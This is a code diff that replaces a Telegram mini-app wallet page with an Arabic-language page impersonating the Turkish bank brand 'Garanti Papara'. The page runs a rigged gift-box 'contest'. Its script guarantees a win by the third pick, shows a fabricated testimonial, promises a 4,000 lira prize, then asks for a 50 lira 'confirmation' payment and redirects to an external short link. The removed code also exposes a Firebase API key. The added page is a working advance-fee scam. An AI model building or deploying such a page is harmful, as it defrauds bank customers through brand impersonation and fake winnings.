@@ -1,359 +1,420 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>صفحة الرئيسية</title>
-    <script src="https://www.gstatic.com/firebasejs/8.3.3/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.3.3/firebase-auth.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.3.3/firebase-firestore.js"></script>
-     <style>
-        * {
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة ترويجية - Garanti Papara</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #000000;
+            --secondary-color: #e30613;
+            --text-color: #333333;
+            --light-gray: #f5f5f5;
+            --white: #ffffff;
+            --success-color: #28a745;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--white);
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-    font-family: 'Arial', sans-serif;
-    background-color: #000;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start; /* جعل المحتوى يبدأ من الأعلى */
-    min-height: 100vh; /* استخدام min-height للسماح بالتمرير */
-    user-select: none;
-    overflow-y: auto; /* تمكين التمرير العمودي */
-}
-
-.container {
-    width: 400px;
-    padding: 20px;
-    margin-top: 100px; /* تغيير الهامش العلوي */
-    /* يمكنك إضافة ارتفاع محدد إذا كنت تريد */
-}
-        .profile {
-            margin-bottom: 20px;
+            color: var(--text-color);
             text-align: center;
+            line-height: 1.6;
         }
-        .profile h2 {
-            font-size: 20px;
-            color: #fff;
-            display: inline; /* لعرض الصورة بجانب الاسم */
-        }
-        .profile p {
-            font-size: 15px;
-            color: #8a8a8a;
-        }
-        .copy-icon {
-            width: 20px;
-            height: 20px;
-            margin-left: 10px;
-        }
-        .balance-container {
-            text-align: center;
-            background-color: #1C1D22;
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: var(--white);
             padding: 20px;
-            border-radius: 10px;
-            margin-top: 40px;
-        }
-        .balance-container h3 {
-            font-size: 18px;
-            color: #777;
-        }
-        .balance-container .balance {
-            font-size: 25px;
-            font-weight: bold;
-            margin-top: 10px;
-            color: #fff;
-        }
-        .balance-container .currency {
-            font-size: 16px;
-            color: #666;
-        }
-        .button-container {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-        }
-        button {
-            background-color: #1C1D22;
-            color: white;
-            padding: 5px 10px;
-            border: none;
-            border-radius: 50px;
-            transition: background 0.3s;
-            width: 20%; /* لتناسب الزرين جنباً إلى جنب */
-        }
-        
-        button img {
-          width: 30px;
-            height: 30px;
-        }
-        /* CSS Popup */
-        .popup {
-            display: none;
-            position: fixed;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .popup-content {
-            background-color: #1C1D22;
-            border-radius: 25px;
-            padding: 30px;
-            text-align: center;
-            width: 80%;
-            max-width: 400px;
             position: relative;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-            color: #fff;
-        }
-        .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            font-size: 24px;
-            color: #fff;
-        }
-        .popup button {
-            padding: 5px 10px;
-            border: none;
-            border-radius: 15px;
-            background: linear-gradient(to right, #3EDAB3, #3EDAB3, #3EDAB3);
-            color: white;
-            font-size: 16px;
-            margin-top: 15px;
         }
         
-        .verification-icon {
-          margin-left: 5px;
+        .logo {
+            width: 180px;
+            margin: 0 auto 20px;
+            display: block;
         }
-
-.icon-container {
-    display: flex;
-    justify-content: space-around;
-    margin-bottom: 20px;
-    gap: 230px;
-    margin-top: -80px
-}
-
-.icon {
-    background-color: #1C1D22; /* لون خلفية */
-    padding: 10px;
-    border-radius: 10px;
-    transition: background 0.3s;
-    width: 35px; /* عرض الكونتينر */
-    height: 35px; /* ارتفاع الكونتينر */
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-
-.icon img {
-    width: 24px; /* حجم الأيقونة */
-    height: 24px;
-}
-
-.nav-container {
-            position: fixed;
-            bottom: 15px;
-            left: 5%;
-            right: 5%;
-            background-color: #1e2126;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            padding: 10px 0;
+        
+        .header {
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            font-size: 24px;
+            font-weight: 700;
         }
-        .nav {
-            display: flex;
-            justify-content: space-around;
-        }
-        .nav button {
-            background-color: transparent;
-            color: #e0e0e0;
-            border: none;
+        
+        .date {
+            color: #666;
+            margin-bottom: 25px;
             font-size: 14px;
         }
-        .nav button img {
-            width: 30px;
-            height: 30px;
-        }
-
-        /* تعديل الأيقونات */
-        .icon-container {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-
-        /* المستطيل أسفل الأزرار */
-        .rectangle {
-            background-color: #3EDAB3;
-            height: 50px;
-            border-radius: 10px;
-            margin-top: 20px; /* المسافة بين الأزرار والمستطيل */
-            text-align: center;
-            line-height: 50px; /* لجعل النص في المنتصف عمودياً */
-            color: white;
+        
+        .subheader {
+            color: var(--primary-color);
+            margin: 25px 0 15px;
             font-size: 18px;
         }
-
+        
+        .instruction {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: var(--text-color);
+        }
+        
+        .highlight {
+            color: var(--secondary-color);
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .gift-boxes {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 30px 0;
+        }
+        
+        .gift-box {
+            width: 90px;
+            height: 90px;
+            background-color: var(--primary-color);
+            color: var(--white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .gift-box i {
+            font-size: 32px;
+        }
+        
+        .gift-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+        }
+        
+        .gift-box.opened {
+            background-color: var(--light-gray);
+            color: #666;
+            cursor: default;
+        }
+        
+        .gift-box.winner {
+            animation: pulse 1.5s infinite;
+            background-color: var(--success-color);
+            color: var(--white);
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .attempts {
+            margin: 25px 0;
+            font-weight: bold;
+            font-size: 16px;
+            color: var(--primary-color);
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #eee;
+            margin: 30px 0;
+        }
+        
+        .testimonial {
+            background-color: var(--light-gray);
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 30px;
+            text-align: right;
+        }
+        
+        .testimonial-name {
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 10px;
+        }
+        
+        .testimonial-time {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background-color: var(--white);
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            cursor: pointer;
+            font-size: 24px;
+            color: #666;
+        }
+        
+        .congrats {
+            color: var(--secondary-color);
+            font-size: 28px;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        
+        .prize-amount {
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--success-color);
+            margin: 20px 0;
+        }
+        
+        .btn {
+            background-color: var(--primary-color);
+            color: var(--white);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: all 0.3s;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            min-width: 200px;
+        }
+        
+        .btn:hover {
+            background-color: #333;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        
+        .payment-info {
+            margin: 25px 0;
+            font-size: 18px;
+            line-height: 1.8;
+        }
+        
+        .payment-amount {
+            font-weight: bold;
+            color: var(--secondary-color);
+            font-size: 24px;
+        }
     </style>
 </head>
 <body>
-  
-<!-- قسم الأيقونات العلوية -->
-<div class="container">
-    
-      <!-- قسم الأيقونات العلوية -->
-      <div class="icon-container">
-        <div class="icon" onclick="navigateTo('go:profile')">
-          <img src="https://img.icons8.com/ios-filled/999/3EDAB3/user.png">
+    <div class="container">
+        <img src="https://up6.cc/2025/05/174612633913691.png" alt="Garanti Papara Logo" class="logo">
+        
+        <h1 class="header">مسابقة ترويجية. اليوم فقط!</h1>
+        <div class="date">02/05/2025</div>
+        
+        <h2 class="subheader">عزيزي عميل Garanti Papara</h2>
+        
+        <p class="instruction">أجرب خطك. فقط قم بإختبار صندوق الهدية المناسب</p>
+        <p class="highlight">إحاول العثور على 4,000 ليرة!</p>
+        
+        <div class="gift-boxes" id="giftBoxes">
+            <div class="gift-box" data-box="1"><i class="fas fa-gift"></i></div>
+            <div class="gift-box" data-box="2"><i class="fas fa-gift"></i></div>
+            <div class="gift-box" data-box="3"><i class="fas fa-gift"></i></div>
+            <div class="gift-box" data-box="4"><i class="fas fa-gift"></i></div>
+            <div class="gift-box" data-box="5"><i class="fas fa-gift"></i></div>
+            <div class="gift-box" data-box="6"><i class="fas fa-gift"></i></div>
         </div>
-        <div class="icon" onclick="navigateTo('go:mene')">
-          <img src="https://img.icons8.com/ios-filled/999/3EDAB3/settings.png">
+        
+        <div class="attempts">المحاولات المتبقية: <span id="remainingAttempts">3</span></div>
+        
+        <div class="divider"></div>
+        
+        <div class="testimonial">
+            <div class="testimonial-name">برهان</div>
+            <div class="testimonial-text">لم أستطع أن أصدق ذلك حتى حصلت عليه! هذه هي المرة الأولى التي أفوز فيها بشيء</div>
+            <div class="testimonial-time">التعليقات: 32 دقيقة</div>
+            <div class="testimonial-time">أزاليا</div>
         </div>
-    
-      </div>
-    
-      <!-- قسم المعلومات الشخصية -->
-      <div class="profile">
-        <h2 id="username">your name</h2>
-        <img src="https://img.icons8.com/material-rounded/999/3EDAB3/verified-account.png" class="verification-icon" alt="Verified" style="width: 20px; height: 20px; vertical-align: middle; display: none;" id="verificationIcon" />
-        <p> UID: <span id="uniqueId">Your ID</span>
-          <img src="https://img.icons8.com/ios-glyphs/999/ffffff/copy.png" class="copy-icon" onclick="copyToClipboard()" />
-        </p>
-      </div>
-    
-      <!-- قسم الرصيد -->
-      <div class="balance-container">
-        <h3>رصيدك الحالي</h3>
-        <div class="balance" id="balance">₺0.00</div>
-        <div class="currency">الليرة التركية</div>
-      </div>
-    
-      <!-- أزرار الإيداع والسحب -->
-      <div class="button-container">
-        <button id="depositButton" onclick="location.href='go:send'">
-          <img src="https://img.icons8.com/ios-filled/999/3EDAB3/sent.png">
-        </button>
-        <button id="withdrawButton" onclick="location.href='go:deposit'">
-          <img src="https://img.icons8.com/color-glass/999/money-circulation.png">
-        </button>
-        <button id="withdrawButton" onclick="location.href='go:withdraw'">
-          <img src="https://img.icons8.com/color-glass/999/refund-2.png">
-        </button>
-        <button id="withdrawButton" onclick="location.href='go:world'">
-          <img src="https://img.icons8.com/material-outlined/999/3EDAB3/geography.png">
-        </button>
-      </div>
-    
-      <!-- المستطيل أسفل الأزرار -->
-      <div class="rectangle">هذا هو المستطيل المضاف</div>
     </div>
-<!-- Popup -->
-<div class="popup" id="popup">
-    <div class="popup-content">
-        <span class="close-btn" onclick="closePopup()">×</span>
-        <p id="popupMessage">تم نسخ UID إلى الحافظة!</p>
-        <button onclick="closePopup()">موافق</button>
+    
+    <!-- Congratulation Modal -->
+    <div class="modal" id="congratsModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('congratsModal')">&times;</span>
+            <h2 class="congrats">مبروك!</h2>
+            <p>لم أستطع أن أصدق ذلك حتى حصلت عليه! هذه هي المرة الأولى التي أفوز فيها بشيء</p>
+            <div class="prize-amount">4,000 ليرة تركية!</div>
+            <button class="btn" onclick="showPaymentModal()">استلام الجائزة</button>
+        </div>
     </div>
-</div>
-
-<div class="nav-container">
-  <div class="nav">
-    <button onclick="navigateTo('go:redeem')" class="active">
-      <img src="https://img.icons8.com/ios-glyphs/999/ffffff/bank-card-back-side.png">
-    </button>
-    <button onclick="navigateTo('go:record')" class="active">
-      <img src="https://img.icons8.com/pixels/999/ffffff/book.png">
-    </button>
-    <button onclick="navigateTo('go:referral')">
-      <img src="https://img.icons8.com/ios-glyphs/999/ffffff/omnichannel.png">
-    </button>
-    <button onclic="navigateTo('home.html')">
-      <img src="https://img.icons8.com/material-rounded/999/3EDAB3/home.png">
-    </button>
-  </div>
-</div>
-
-<script>
-// إعداد Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyADJJPRxJhItXVJ2cEsIymB1WuVVDpQlHI",
-      authDomain: "telegram-mini-app-c3189.firebaseapp.com",
-      projectId: "telegram-mini-app-c3189",
-      storageBucket: "telegram-mini-app-c3189.appspot.com",
-      messagingSenderId: "1078003355289",
-      appId: "1:1078003355289:web:99ce2ce7471a6e5595f208"
-    };
     
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
-    const auth = firebase.auth();
+    <!-- Payment Modal -->
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('paymentModal')">&times;</span>
+            <h2 class="congrats">تأكيد الاستلام</h2>
+            <div class="payment-info">
+                <p>يجب اكمال الدفع مبلغ <span class="payment-amount">50 ليرة</span> لتأكيد العملية</p>
+                <p>سيتم خصم المبلغ من حسابك المؤقت</p>
+            </div>
+            <button class="btn" onclick="redirectToPayment()">تأكيد الدفع</button>
+        </div>
+    </div>
     
-    // الحصول على المستخدم الحالي وتحديث المعلومات بشكل مباشر
-    auth.onAuthStateChanged(user => {
-      if (user) {
-        const uid = user.uid;
-    
-        // جلب البيانات من قاعدة البيانات
-        db.collection("users").doc(uid).get().then(doc => {
-          if (doc.exists) {
-            const data = doc.data();
-            document.getElementById("username").innerText = data.name;
-            document.getElementById("uniqueId").innerText = data.uniqueId;
-    
-            // إضافة فواصل للرصيد باللغة الإنجليزية
-            document.getElementById("balance").innerText = `₺${data.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
-    
-            // تحقق مما إذا كان المستخدم موثقًا
-            if (data.verified) {
-              document.getElementById("verificationIcon").style.display = "inline"; // عرض صورة التحقق
-            }
-          } else {
-            console.log("لا يوجد مستند للمستخدم.");
-          }
-        }).catch(error => {
-          console.error("خطأ في جلب البيانات:", error);
+    <script>
+        // Select random winning box (1 in 6 chance)
+        const winningBox = Math.floor(Math.random() * 6) + 1;
+        let attemptsLeft = 3;
+        let hasWon = false;
+        let selectedBoxes = [];
+        
+        // Function to open the winning box automatically
+        function openWinningBox() {
+            if (hasWon) return;
+            
+            const boxes = document.querySelectorAll('.gift-box');
+            const winningBoxElement = boxes[winningBox - 1];
+            
+            winningBoxElement.classList.add('opened', 'winner');
+            winningBoxElement.innerHTML = '<i class="fas fa-trophy"></i>';
+            hasWon = true;
+            
+            // Show confetti effect
+            showConfetti();
+            
+            setTimeout(() => {
+                document.getElementById('congratsModal').style.display = 'flex';
+            }, 1000);
+        }
+        
+        // Add click event to all gift boxes
+        document.querySelectorAll('.gift-box').forEach(box => {
+            box.addEventListener('click', function() {
+                if (this.classList.contains('opened') || attemptsLeft <= 0 || hasWon) {
+                    return;
+                }
+                
+                const boxNumber = parseInt(this.getAttribute('data-box'));
+                this.classList.add('opened');
+                selectedBoxes.push(boxNumber);
+                this.innerHTML = boxNumber === winningBox ? '<i class="fas fa-trophy"></i>' : '<i class="fas fa-box-open"></i>';
+                
+                if (boxNumber === winningBox) {
+                    // This is the winning box
+                    this.classList.add('winner');
+                    hasWon = true;
+                    
+                    // Show confetti effect
+                    showConfetti();
+                    
+                    setTimeout(() => {
+                        document.getElementById('congratsModal').style.display = 'flex';
+                    }, 1000);
+                }
+                
+                attemptsLeft--;
+                document.getElementById('remainingAttempts').textContent = attemptsLeft;
+                
+                // If this is the third attempt and user hasn't won yet
+                if (attemptsLeft === 0 && !hasWon) {
+                    setTimeout(() => {
+                        openWinningBox();
+                    }, 500);
+                }
+            });
         });
-      } else {
-        window.location.href = "go:login"; // إعادة توجيه المستخدم إذا لم يكن مسجلاً
-      }
-    });
-    
-    // وظيفة نسخ UID إلى الحافظة
-    function copyToClipboard() {
-      const uniqueId = document.getElementById("uniqueId").innerText;
-      navigator.clipboard.writeText(uniqueId).then(() => {
-        showPopup("تم نسخ UID إلى الحافظة!"); // عرض الـ Popup
-      }).catch(err => {
-        console.error('خطأ في النسخ إلى الحافظة: ', err);
-      });
-    }
-    
-    // وظيفة لعرض الـ Popup
-    function showPopup(message) {
-      document.getElementById("popupMessage").innerText = message;
-      document.getElementById("popup").style.display = "flex"; // عرض الـ Popup
-    }
-    
-    // وظيفة لإغلاق الـ Popup
-    function closePopup() {
-      document.getElementById("popup").style.display = "none"; // إخفاء الـ Popup
-    }
-    
-    function navigateTo(page) {
-      window.location.href = page;
-    }
-    
-</script>
-
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+        
+        function showPaymentModal() {
+            document.getElementById('congratsModal').style.display = 'none';
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+        
+        function redirectToPayment() {
+            window.location.href = 'https://ppr.ist/23snPYhR8';
+        }
+        
+        function showConfetti() {
+            // Create 50 confetti pieces
+            for (let i = 0; i < 50; i++) {
+                createConfettiPiece();
+            }
+        }
+        
+        function createConfettiPiece() {
+            const confetti = document.createElement('div');
+            confetti.innerHTML = '<i class="fas fa-star"></i>';
+            confetti.style.position = 'fixed';
+            confetti.style.color = getRandomColor();
+            confetti.style.fontSize = Math.random() * 10 + 10 + 'px';
+            confetti.style.left = Math.random() * window.innerWidth + 'px';
+            confetti.style.top = -20 + 'px';
+            confetti.style.zIndex = '1000';
+            confetti.style.opacity = '0.8';
+            confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+            
+            document.body.appendChild(confetti);
+            
+            const animationDuration = Math.random() * 3 + 2;
+            
+            confetti.animate([
+                { top: -20 + 'px', transform: `rotate(0deg)` },
+                { top: window.innerHeight + 'px', transform: `rotate(${Math.random() * 360}deg)` }
+            ], {
+                duration: animationDuration * 1000,
+                easing: 'cubic-bezier(0.1, 0.8, 0.9, 1)'
+            });
+            
+            setTimeout(() => {
+                confetti.remove();
+            }, animationDuration * 1000);
+        }
+        
+        function getRandomColor() {
+            const colors = ['#e30613', '#28a745', '#ffc107', '#17a2b8', '#343a40'];
+            return colors[Math.floor(Math.random() * colors.length)];
+        }
+    </script>
 </body>
 </html>
